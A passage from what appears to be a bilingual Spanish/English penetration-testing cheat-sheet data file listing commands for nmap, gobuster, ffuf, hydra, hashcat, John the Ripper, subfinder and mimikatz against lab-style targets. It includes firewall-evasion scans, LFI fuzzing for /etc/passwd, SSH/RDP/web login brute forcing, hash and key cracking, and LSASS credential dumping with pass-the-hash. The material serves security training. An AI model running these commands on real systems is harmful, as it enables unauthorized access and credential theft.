--script → Invokes a specific NSE script, in this case to scan for the critical Apache Struts CVE-2017-5638 exploit.
--script-args → Feeds arguments directly to the Nmap script execution, such as the application endpoint uri.

EJEMPLO:
nmap -p 8080 --script http-vuln-cve2017-5638 --script-args path=/showcase.action 10.10.14.45

TIP: You can search local Nmap scripts quickly with "ls /usr/share/nmap/scripts/ | grep http-" to discover helpful auditing plugins.
===FIN===

===CASO===
TITULO: Fast network host discovery via UDP
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
sudo nmap -sU -p <udp_ports> --max-retries 1 <target_ip>

FLAGS:
-sU → Triggers UDP port scanning to discover critical services like DNS, SNMP, TFTP, or DHCP.
-p → Restricts the scan to classic target UDP ports to significantly speed up response times.
--max-retries → Limits packet retransmission per port to avoid hanging on slow network timeouts.

EJEMPLO:
sudo nmap -sU -p 53,161,162,137,138 --max-retries 1 10.10.10.254

TIP: UDP services are prone to false positives caused by firewall filtering. Always validate your findings using specific queries (e.g., dig for DNS, onesixtyone for SNMP).
===FIN===

===CASO===
TITULO: Firewall Evasion Tactical Scan (IP fragmentation and Decoy spoofing)
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
sudo nmap -f -D <decoy_ip1>,<decoy_ip2>,ME -S <spoof_ip> -e <interface> -g <source_port> <target_ip>

FLAGS:
-f → Fragment IP packets into small 8-byte chunks to confuse simple firewalls state assemblies.
-D → Cover attacker's footprint by scrambling real IP addresses with active decoy hosts.
-S → Spoof originating source IP address to inspect packet response filters.
-e → Explicity enforce outgoing network adapter interface.
-g → Direct traffic initiating from familiar services source ports (53 for DNS, 88 for Kerberos) to bypass firewall rules.

EJEMPLO:
sudo nmap -f -D 10.10.10.5,10.10.10.12,ME -S 10.10.10.99 -e eth0 -g 53 10.10.10.150

TIP: Fully spoofing the source IP address (-S) might result in unreceived responses if your gateway rules prevent routing traffic back to your container.
===FIN===`},gobuster:{name:"gobuster",description:"Herramienta de fuzzing rápido de directorios, subdominios o parámetros en Go",descriptionEn:"High-speed directory, subdomain, and virtual host brute forcing tool in Go",category:"Web",rawText:`===CASO===
TITULO: Descubrimiento de archivos y directorios web sensibles
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
gobuster dir -u <target_url> -w <wordlist_path> -x <extensions> -t <threads_num>

FLAGS:
dir → Activa el modo de escaneo de directorios y archivos.
-u → Especifica la URL base enriquecida del servidor HTTP/HTTPS objetivo.
-w → Ruta local del diccionario de palabras (wordlist) para la fuerza bruta.
-x → Lista separada por comas de extensiones de archivo a buscar de forma correlativa (ej: php,txt,zip,json).
-t → Número de hilos concurrentes para modificar la velocidad de las peticiones.

EJEMPLO:
gobuster dir -u http://target.htb:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,xml,bak,db -t 40

TIP: Para evadir listados ruidosos de error 200 provocados por redirecciones persistentes, incluye el flag "-b 301,302" o usa el flag "--wildcard" para autodetectar páginas personalizadas de error.
===FIN===

===CASO===
TITULO: Enumeración exhaustiva de subdominios de forma recursiva por DNS masivo
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
gobuster dns -d <target_domain> -w <dns_wordlist_path> -r <dns_resolver_ip>

FLAGS:
dns → Cambia al modo de descubrimiento de nombres de subdominios por resolución DNS directa.
-d → Define el nombre de dominio principal o raíz.
-w → Ruta del diccionario optimizado para nombres de subdominio.
-r → Servidor DNS de confianza externo para realizar las consultas DNS sin saturar el resolver del sistema.

EJEMPLO:
gobuster dns -d internal.target.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r 1.1.1.1

TIP: Asegúrate de tener permisos. Si estás usando un resolver corporativo interno, deja el flag predeterminado para resolver registros locales que no estén vinculados al DNS externo público.
===FIN===

===CASO===
TITULO: Fuerza bruta de Hosts Virtuales para descubrir subdominios internos ocultos
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
gobuster vhost -u <target_url> -w <vhost_wordlist> -t <threads_num>

FLAGS:
vhost → Activa el modo de fuerza bruta contra cabeceras HTTP "Host" para probar dominios alternativos asociados al servidor IP.
-u → Define el punto final de comunicación URL del servidor web destino.
-w → Archivo de dominio o lista para mapear subdominios sospechosos.
-t → Modula la concurrencia aumentando o disminuyendo threads de red.

EJEMPLO:
gobuster vhost -u http://10.10.10.45/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

TIP: Este método es vital para identificar sitios de desarrollo o intranets internas privadas alojadas en un único servidor Apache/Nginx sin registros DNS públicos asignados todavía.
===FIN===`,rawTextEn:`===CASO===
TITULO: Sensitive web directory and file discovery
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
gobuster dir -u <target_url> -w <wordlist_path> -x <extensions> -t <threads_num>

FLAGS:
dir → Activates directory and file scanning mode.
-u → Specifies the target URL of the HTTP/HTTPS host.
-w → Local absolute path to the dictionary file (wordlist) for bruteforcing.
-x → Comma-separated list of suffixes/extensions to join and search (e.g., php,txt,zip,json).
-t → Number of concurrent threads to modify processing speeds.

EJEMPLO:
gobuster dir -u http://target.htb:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,xml,bak,db -t 40

TIP: To avoid noisy 200 status codes caused by wildcard redirects, supply "-b 301,302" or leverage the "--wildcard" flag to detect custom error templates.
===FIN===

===CASO===
TITULO: Exhaustive subdomain discovery via DNS brute forcing
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
gobuster dns -d <target_domain> -w <dns_wordlist_path> -r <dns_resolver_ip>

FLAGS:
dns → Activates DNS mode to resolve valid subdomains.
-d → Sets the target root domain.
-w → Subdomain specific dictionary targeting host prefixes.
-r → Uses a custom reliable DNS server rather than relying entirely on the local resolver.

EJEMPLO:
gobuster dns -d internal.target.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r 1.1.1.1

TIP: If scanning internal company environments, omit the custom resolver "-r" flag to ensure internal DNS records are queries correctly.
===FIN===

===CASO===
TITULO: Virtual Host (VHost) brute forcing to discover hidden internal portals
CATEGORIA: Reconocimiento
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
gobuster vhost -u <target_url> -w <vhost_wordlist> -t <threads_num>

FLAGS:
vhost → Enables Host Header parsing brute force to locate alternative domain routes configured on the same IP.
-u → Specifies the base URL endpoint.
-w → References common subdomain list dictionaries.
-t → Modifies running connections threads count (concurrency limit).

EJEMPLO:
gobuster vhost -u http://10.10.10.45/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50

TIP: Incredible resource to audit backend configurations where internal developer portals exist on Nginx or Apache without real-world external DNS links.
===FIN===`},ffuf:{name:"ffuf",description:"Fuzzing Engine en Go - Rápido, flexible y modular para ataques Web",descriptionEn:"Highly parallelizable and modular web fuzzing engine written in Go",category:"Web",rawText:`===CASO===
TITULO: Descubrimiento rápido de directorios ocultos con filtros de código de respuesta
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
ffuf -u <target_url>/FUZZ -w <wordlist> -mc 200,204,301,302,403

FLAGS:
-u → Especifica la URL objetivo incluyendo la palabra clave 'FUZZ' donde se inyectará el diccionario.
-w → Define la ruta absoluta al diccionario de fuerza bruta o hacking.
-mc → Configura los códigos de estado HTTP permitidos para mostrar en la consola terminal de resultados.

EJEMPLO:
ffuf -u http://admin.target.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,403

TIP: El flag "-mc 200" filtrará todo menos páginas exitosas. Usa "-fc 404" para ocultar errores comunes 'Not Found', permitiendo descubrir páginas alternativas interesantes de 3xx/4xx.
===FIN===

===CASO===
TITULO: Inyección dinámica en valores de cabeceras HTTP (Fuzzing del User-Agent para Shellshock u OPSEC)
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
ffuf -u <target_url> -H "User-Agent: FUZZ" -w <agents_wordlist> -fs <exclude_size>

FLAGS:
-H → Define una cabecera HTTP personalizada. Aquí ponemos la variable FUZZ en el User-Agent para rotar identidades de navegador.
-fs → Excluye del panel de resultados cualquier respuesta que tenga exactamente este tamaño en bytes para evitar ruido homogéneo de protección WAF.

EJEMPLO:
ffuf -u http://firmware.target.htb/cgi-bin/status -H "User-Agent: FUZZ" -w /usr/share/wordlists/SecLists/Miscellaneous/web-useragents.txt -fs 293

TIP: Este método es el estándar industrial para detectar vulnerabilidades en scripts Common Gateway Interface (CGI) que parsean cabeceras de tráfico directamente de la cabecera.
===FIN===

===CASO===
TITULO: Fuzzing de parámetros GET para descubrimiento de Local File Inclusion (LFI)
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
ffuf -u <target_url>?<parameter>=FUZZ -w <wordlist> -mr <grep_regex>

FLAGS:
-u → URL del endpoint que incluye el parámetro GET a auditar con inyección FUZZ.
-w → Localización del diccionario de payloads de saltos de directorio.
-mr → Filtra de forma estricta los resultados, mostrando solo aquellos cuya respuesta contenga la coincidencia regex formulada (ej: rastro de contenido de archivos de linux /etc/passwd).

EJEMPLO:
ffuf -u http://vuln.target.htb/page.php?file=FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:"

TIP: El valor de -mr es increíblemente útil para descartar falsos positivos y encontrar inmediatamente si el archivo /etc/passwd o win.ini ha sido expuesto con éxito.
===FIN===`,rawTextEn:`===CASO===
TITULO: Fast hidden directory fuzzing with response code filters
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
ffuf -u <target_url>/FUZZ -w <wordlist> -mc 200,204,301,302,403

FLAGS:
-u → Specifies the target URL containing the 'FUZZ' placeholder where entries will be injected.
-w → Sets the file path of the hacking dictionary.
-mc → Matches selected HTTP response status codes to output on the results screen.

EJEMPLO:
ffuf -u http://admin.target.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,403

TIP: The filter "-mc 200" isolates directories that are directly accessible. Use "-fc 404" to hide typical "Not Found" errors and discover redirected dashboards.
===FIN===

===CASO===
TITULO: Dynamic HTTP header fuzzing (User-Agent rotation for Shellshock or OPSEC)
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
ffuf -u <target_url> -H "User-Agent: FUZZ" -w <agents_wordlist> -fs <exclude_size>

FLAGS:
-H → Defines a custom HTTP Header value. We replace User-Agent with FUZZ to audit agent parsing behavior on the server.
-fs → Excludes response bodies of a specific size in bytes to block redundant WAF/blocking pages.

EJEMPLO:
ffuf -u http://firmware.target.htb/cgi-bin/status -H "User-Agent: FUZZ" -w /usr/share/wordlists/SecLists/Miscellaneous/web-useragents.txt -fs 293

TIP: This approach represents the standard industry technique for locating Shellshock or command injections parsed within CGI system headers.
===FIN===

===CASO===
TITULO: Parameter Fuzzing to identify Local File Inclusion (LFI)
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
ffuf -u <target_url>?<parameter>=FUZZ -w <wordlist> -mr <grep_regex>

FLAGS:
-u → Defines target HTTP endpoint injecting dictionary items into parameters values.
-w → Direct path indicating path traversal payloads.
-mr → Strict regex pattern matcher used to inspect returned code (e.g. matching administrative output like "root:").

EJEMPLO:
ffuf -u http://vuln.target.htb/page.php?file=FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:"

TIP: The -mr modifier guarantees that you'll quickly isolate successful traversals (such as reading /etc/passwd contents) avoiding noisy HTML responses.
===FIN===`},hydra:{name:"hydra",description:"Iniciador de logins paralelos muy rápido que admite numerosos protocolos",descriptionEn:"Ultra-fast network login bruteforcer supporting a wide range of network protocols",category:"Passwords",rawText:`===CASO===
TITULO: Fuerza bruta dirigida contra cuentas SSH con usuarios y contraseñas fijas
CATEGORIA: Passwords
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
hydra -l <username> -P <wordlist_passwords> -t <threads> ssh://<target_ip>

FLAGS:
-l → Especifica un único nombre de usuario conocido fijo para concentrar el ataque.
-P → Carga una lista o diccionario completo de contraseñas. Requiere un archivo válido en el disco.
-t → Cambia el número de tareas concurrentes que envían credenciales simultáneamente (menor número = más seguro para el servicio SSH objetivo).

EJEMPLO:
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.11.200

TIP: Por defecto ssh en servidores modernos bloquea accesos temporalmente si hay muchas conexiones. Mantén el valor de -t en 4 o 2 para SSH. Para servicios rápidos como FTP u MySQL puedes subir -t a 16 o 32 de manera segura.
===FIN===

===CASO===
TITULO: Ataque de diccionario a panel de autenticación web con formulario HTTP-POST
CATEGORIA: Passwords
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
hydra <target_ip> http-post-form "<form_action_path>:<user_param>=^USER^&<pass_param>=^PASS^:<error_message_pattern>" -L <users_list> -P <pass_list>

FLAGS:
http-post-form → Protocolo adaptativo para paneles HTLM que no admiten Basic Auth tradicional.
-L → Lista de posibles nombres de usuarios objetivo.
^USER^ y ^PASS^ → Placeholders internos dinámicos de Hydra que serán inyectados con parejas del diccionario.

EJEMPLO:
hydra 10.10.10.50 http-post-form "/login.php:username=^USER^&password=^PASS^:Flipped incorrect" -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt

TIP: El campo del patrón de error debe coincidir con un fragmento de texto exacto presente cuando la clave falla (ej: "Invalid login", "incorrect"). Si hay tokens anti-CSRF activos, Hydra no funcionará de forma nativa.
===FIN===

===CASO===
TITULO: Fuerza bruta contra el protocolo de escritorio remoto (RDP) de Windows
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
hydra -L <users_list> -P <pass_list> -V -t <threads> <target_ip> rdp

FLAGS:
-L → Ruta a la lista de nombres de usuario a auditar de manera secuencial.
-P → Archivo diccionario para validar candidatos a contraseña.
-V → Habilita el modo verbose para mostrar el par de credenciales probado en tiempo real.
-t → Modera el número de conexiones simultaneas para no colapsar el servicio lsm/termsrv de Windows.

EJEMPLO:
hydra -L administradores.txt -P claves_top50.txt -V -t 2 10.10.10.120 rdp

TIP: RDP es muy ruidoso y monitorizado. Si realizas fuerza bruta múltiple corres el riesgo de bloquear cuentas por políticas de lockout en el Active Directory. Usa con precaución.
===FIN===`,rawTextEn:`===CASO===
TITULO: Targeted SSH brute force with specified username and password lists
CATEGORIA: Passwords
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
hydra -l <username> -P <wordlist_passwords> -t <threads> ssh://<target_ip>

FLAGS:
-l → Uses a fixed, specific username to fine-tune and concentrate audit speeds.
-P → Loads a password dictionary list from absolute file paths.
-t → Dictates active concurrent tasks sending credentials to parallelize processing.

EJEMPLO:
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.11.200

TIP: Modern SSH servers block abusive connections under rate-limiting policies. Always lock threads "-t" to 4 or 2 for SSH. For protocols like FTP, MySQL, or Telnet, you can safely scale threads up to 16 or 32.
===FIN===

===CASO===
TITULO: Dictionary attack against web login panels via HTTP-POST forms
CATEGORIA: Passwords
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
hydra <target_ip> http-post-form "<form_action_path>:<user_param>=^USER^&<pass_param>=^PASS^:<error_message_pattern>" -L <users_list> -P <pass_list>

FLAGS:
http-post-form → Web module to handle forms over POST payloads that don't use standard HTTP Basic Auth.
-L → File path listing candidate usernames.
^USER^ and ^PASS^ → Internal keyword placeholders mapped by Hydra to substitute values sequentially.

EJEMPLO:
hydra 10.10.10.50 http-post-form "/login.php:username=^USER^&password=^PASS^:Flipped incorrect" -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt

TIP: The error pattern MUST match a raw string returned by the web page exclusively upon failed access (e.g., "Invalid password", "incorrect"). Hydra doesn't support active anti-CSRF token rotation natively.
===FIN===

===CASO===
TITULO: Brute forcing Windows Remote Desktop Protocol (RDP) sessions
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
hydra -L <users_list> -P <pass_list> -V -t <threads> <target_ip> rdp

FLAGS:
-L → Defines relative path containing target domain or machine usernames.
-P → Target passwords wordlist.
-V → Enable verbose output showing evaluated entries on active pipelines.
-t → Constrain concurrent threads to avoid blocking memory limits of targeted Windows systems.

EJEMPLO:
hydra -L admin_names.txt -P top50_passes.txt -V -t 2 10.10.10.120 rdp

TIP: RDP auditing triggers a lot of logs. Mind account lockout threshold rules configured in the target directory to avoid massive denial-of-service locks.
===FIN===`},hashcat:{name:"hashcat",description:"El recuperador de contraseñas con soporte GPU y CPU más rápido del mundo",descriptionEn:"The world's fastest GPU/CPU-powered password recovery and hash cracking engine",category:"Passwords",rawText:`===CASO===
TITULO: Hacheo de hashes NTLM obtenidos en entornos Active Directory (Modo 1000)
CATEGORIA: Passwords
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
hashcat -m 1000 -a 0 <hashes_file> <wordlist_file> -O

FLAGS:
-m → Código del protocolo hash a procesar. El modo 1000 indica NTLM puro.
-a → Especifica el tipo de ataque. El valor 0 es ataque convencional de diccionario.
-O → Optimiza los hilos de ejecución de la tarjeta gráfica u OpenCL del hardware de forma forzada para acelerar el cálculo exponencial.

EJEMPLO:
hashcat -m 1000 -a 0 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -O

TIP: Puedes verificar la configuración de tu tarjeta gráfica o CPU listando los dispositivos con el comando "hashcat -I".
===FIN===

===CASO===
TITULO: Ataque híbrido con reglas avanzadas para hashes SHA-256 de sistemas Linux modernos
CATEGORIA: Passwords
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
hashcat -m 1800 -a 0 <hashes_file> <wordlist> -r <rule_file_path>

FLAGS:
-m 1800 → Especifica algoritmo SHA-512 crypt común en archivos /etc/shadow.
-r → Lee un juego de reglas de mutación que alteran cada palabra del diccionario (ej: agregar números al final, capitalizar la primera letra, duplicar cadena).

EJEMPLO:
hashcat -m 1800 -a 0 shadow_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

TIP: El uso de reglas multiplica el alcance de un diccionario convencional de forma brutal. La regla best64.rule es perfecta como punto de partida rápido para testear variaciones de contraseñas de red corporativas.
===FIN===

===CASO===
TITULO: Ataque de máscara para hashes NTLM utilizando patrones específicos conocidos
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
hashcat -m 1000 -a 3 <hashes_file> <mask_pattern>

FLAGS:
-m 1000 → Hash tipo NTLM de Windows.
-a 3 → Activa el ataque por máscara (fuerza bruta guiada).
<mask_pattern> → Cadena que mapea caracteres posicionales específicos. Por ejemplo: ?u?l?l?l?d?d (Una mayúscula, tres minúsculas y dos números).

EJEMPLO:
hashcat -m 1000 -a 3 hashes_ad.txt ?u?l?l?l?l2026!

TIP: Las máscaras optimizan el tiempo enormemente cuando se sospecha que los empleados respetan políticas rígidas del departamento (ejemplo: comenzar con mayúscula, seguido de letras minúsculas, el año actual y un símbolo).
===FIN===`,rawTextEn:`===CASO===
TITULO: Cracking NTLM hashes from Active Directory environments (Mode 1000)
CATEGORIA: Passwords
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
hashcat -m 1000 -a 0 <hashes_file> <wordlist_file> -O

FLAGS:
-m → Hash identifier code. Setting 1000 targets NTLM formats directly.
-a → Attack profile selection. 0 maps to a classic dictionary-only search.
-O → Enforces optimized OpenCL kernel threads execution to speed up compute iteration limits.

EJEMPLO:
hashcat -m 1000 -a 0 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -O

TIP: Verify graphics processing units and hardware backend parameters with "hashcat -I".
===FIN===

===CASO===
TITULO: Hybrid attack with advanced rules against modern Linux SHA-512 hashes
CATEGORIA: Passwords
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
hashcat -m 1800 -a 0 <hashes_file> <wordlist> -r <rule_file_path>

FLAGS:
-m 1800 → Selects the SHA-512 crypt algorithm utilized in typical /etc/shadow credential configurations.
-r → Loads a mutation rule file which dynamically alters word configurations (e.g., adding numbers, toggling capitalization, duplicating strings).

EJEMPLO:
hashcat -m 1800 -a 0 shadow_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

TIP: Leveraging mutation rules expands directory reach exponentially. The rule best64.rule forms an ideal starting catalog for corporate credential target audits.
===FIN===

===CASO===
TITULO: Mask attack for cracking NTLM hashes using positional structures
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
hashcat -m 1000 -a 3 <hashes_file> <mask_pattern>

FLAGS:
-m 1000 → Targets NTLM windows hashes.
-a 3 → Mode 3 triggers Mask (guided brute force) execution instead of simple catalogs.
<mask_pattern> → Mask formats representing placeholders sequence (such as ?u for uppercase letter, ?l for lowercase, ?d for decimal digit).

EJEMPLO:
hashcat -m 1000 -a 3 hashes_ad.txt ?u?l?l?l?l2026!

TIP: Mask patterns dramatically conserve processing power if the corporate environment enforces predictable credential complexity formats.
===FIN===`},subfinder:{name:"subfinder",description:"Herramienta rápida de descubrimiento de subdominios pasivos utilizando APIs públicas",descriptionEn:"Highly efficient passive subdomain discovery tool leveraging public search APIs",category:"Reconocimiento",rawText:`===CASO===
TITULO: Enumeración rápida y pasiva de subdominios sin enviar un solo paquete directo al objetivo
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
subfinder -d <target_domain> -o <output_txt> -v

FLAGS:
-d → Especifica el dominio raíz o la empresa principal a enumerar pasivamente.
-o → Guarda exclusivamente la lista ordenada y única de subdominios descubiertos.
-v → Imprime verbose para rastrear qué APIs pasivas se están consultando activamente en tiempo real.

EJEMPLO:
subfinder -d mega-inc.htb -o subdominios_descubiertos.txt -v

TIP: Agrega claves de API en el archivo "$HOME/.config/subfinder/provider-config.yaml" para activar servicios premium gratuitos como BinaryEdge, Shodan, Censys y VirusTotal, lo que duplicará tus resultados pasivos.
===FIN===

===CASO===
TITULO: Tubería automatizada: Reconocimiento pasivo enlazado con detección activa web HTTPX
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
subfinder -d <target_domain> -silent | httpx -title -tech-detect -status-code -o <output_file>

FLAGS:
-silent → Deshabilita logs de cabeceras visuales y errores para canalizar únicamente dominios limpios por STDOUT.
-title → (Filtro HTTPX) Extrae el título HTML de las páginas web que estén activas.
-tech-detect → (Filtro HTTPX) Expone qué tecnologías (WAF, CMS, Servidor) corre cada subdominio.
-status-code → (Filtro HTTPX) Muestra el estado del puerto HTTP (ej: 200, 403, 500).

EJEMPLO:
subfinder -d target.com -silent | httpx -title -tech-detect -status-code -o activas.txt

TIP: Concatenar ambas herramientas te ayuda a descartar dominios apagados o redirigidos pasándolos directo a tu navegador listo para investigar.
===FIN===`,rawTextEn:`===CASO===
TITULO: Fast and passive subdomain enumeration without sending a single direct packet to the target
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
subfinder -d <target_domain> -o <output_txt> -v

FLAGS:
-d → Defines the root domain to passive brute-force / query API endpoints.
-o → Streamlines results directly to a text file.
-v → Verbose logging to monitor which API backends are responding.

EJEMPLO:
subfinder -d mega-inc.htb -o subdominios_discovered.txt -v

TIP: Populate key mappings inside "$HOME/.config/subfinder/provider-config.yaml" to authenticate with Shodan, Censys, and VirusTotal to double discovery rates.
===FIN===

===CASO===
TITULO: Chained pipeline: passive subdomain gathering coupled with active HTTPX probing
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
subfinder -d <target_domain> -silent | httpx -title -tech-detect -status-code -o <output_file>

FLAGS:
-silent → Suppresses banner arts and debugging messages to feed clean subdomains lists directly into OS pipes.
-title → Extractions of responsive page titles on remote sockets.
-tech-detect → Analyzes underlying technologies running (CMS, server engines, frameworks).
-status-code → Resolves return status code values (e.g. 200, 301, 403).

EJEMPLO:
subfinder -d target.com -silent | httpx -title -tech-detect -status-code -o active_targets.txt

TIP: Connecting these utilities bypasses dead records by automatically focusing audit plans only onto responsive web structures.
===FIN===`},john:{name:"john",description:"Crackeador de contraseñas rápido y sumamente flexible para hashes de sistemas, llaves y documentos",descriptionEn:"Aggressive, modular multi-format password cracker for system hashes and documents",category:"Passwords",rawText:`===CASO===
TITULO: Cifrado y crackeo básico de hash con diccionario Rockyou
CATEGORIA: Passwords
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
john --wordlist=<wordlist_path> <hashes_file>

FLAGS:
--wordlist → Define la ruta absoluta al diccionario de hashing / hacking a utilizar.
<hashes_file> → Archivo con formato de contraseña hacheada a romper.

EJEMPLO:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_shadow.txt

TIP: De forma predeterminada John the Ripper autodetecta el algoritmo del hash, pero puedes forzarlo usando el flag como --format=raw-md5 para acelerar drásticamente el proceso.
===FIN===

===CASO===
TITULO: Fuerza bruta contra llaves privadas de SSH encriptadas
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
ssh2john <ssh_key_file> > <output_file>_hash && john --wordlist=<wordlist_path> <output_file>_hash

FLAGS:
ssh2john → Script helper de Python que convierte la llave SSH encriptada en un formato de hash reconocible por john.
--wordlist → Diccionario usado para intentar descifrar la frase de paso de la de llave.

EJEMPLO:
ssh2john id_rsa > id_rsa_hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash

TIP: Una vez obtenida la contraseña en claro del hash, puedes conectarte con "ssh -i id_rsa usuario@ip", introduciendo la frase descifrada.
===FIN===

===CASO===
TITULO: Extracción y descifrado de contraseñas de archivos PDF protegidos
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
pdf2john <pdf_file> > <output_hash> && john --wordlist=<wordlist_path> <output_hash>

FLAGS:
pdf2john → Utilidad para convertir esquemas criptográficos de seguridad de Adobe PDF en firmas hash planas.
--wordlist → Carga la lista de referencias en texto plano para el ataque.

EJEMPLO:
pdf2john balance_corporativo.pdf > pdf.hash && john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash

TIP: Increíble método para auditar la debilidad de manuales de usuario o documentos corporativos restringidos adjuntos sin autorización en depósitos públicos.
===FIN===`,rawTextEn:`===CASO===
TITULO: Basic hash cracking using the Rockyou wordlist
CATEGORIA: Passwords
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
john --wordlist=<wordlist_path> <hashes_file>

FLAGS:
--wordlist → Allocates the file location of the attack dictionary.
<hashes_file> → Plaintext targets listing encrypted hashes.

EJEMPLO:
john --wordlist=/usr/share/wordlists/rockyou.txt hashes_shadow.txt

TIP: John automatically finger-prints algorithms on boot, but you can override lookup speeds with specific tags like "--format=raw-md5".
===FIN===

===CASO===
TITULO: Brute forcing passphrase of encrypted SSH private keys
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
ssh2john <ssh_key_file> > <output_file>_hash && john --wordlist=<wordlist_path> <output_file>_hash

FLAGS:
ssh2john → Formats the encrypted private RSA/DSA SSH key file into a parseable hash signature.
--wordlist → Maps wordlist locations.

EJEMPLO:
ssh2john id_rsa > id_rsa_hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash

TIP: Once successfully cracked, initiate target logins with SSH identity markers "ssh -i id_rsa user@host" using the recovered key phrase.
===FIN===

===CASO===
TITULO: Extracting and cracking encrypted PDF passwords
CATEGORIA: Passwords
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
pdf2john <pdf_file> > <output_hash> && john --wordlist=<wordlist_path> <output_hash>

FLAGS:
pdf2john → Companion tool that structures raw PDF security schemes into hashes format.
--wordlist → Applies standard cracking arrays.

EJEMPLO:
pdf2john tax_assessment.pdf > target_pdf.hash && john --wordlist=/usr/share/wordlists/rockyou.txt target_pdf.hash

TIP: Extremely helpful to reveal weak document passwords protecting shared invoices or manuals left sitting in public file servers.
===FIN===`},mimikatz:{name:"mimikatz",description:"Herramienta líder de post-explotación para Windows que vuelca contraseñas, hashes y tickets Kerberos",descriptionEn:"Infamous post-exploitation security auditing package to compromise logs, hashes, and Kerberos tokens",category:"Post-explotación",rawText:`===CASO===
TITULO: Extracción directa de contraseñas LSASS en claro de la memoria RAM de Windows
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

FLAGS:
privilege::debug → Requiere privilegios de Administrador local para adquirir el token SeDebugPrivilege que permite tocar la memoria lsass.exe.
sekurlsa::logonpasswords → Ataca el proveedor SSP para volcar credenciales wdigest en texto claro y hashes NTLM.

EJEMPLO:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

TIP: En sistemas modernos de Windows Server wdigest está deshabilitado por seguridad de por sí. Sin embargo, los hashes NTLM siguen expuestos y sirven para ataques de post-explotación dinámicos.
===FIN===

===CASO===
TITULO: Ejecución de Pass-the-Hash (PtH) mediante secuestros de tokens de Windows
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<username> /domain:<target_domain> /ntlm:<hashes_file> /run:cmd.exe" exit

FLAGS:
/user → Nombre del usuario administrador remoto o local cuyos tokens secuestramos.
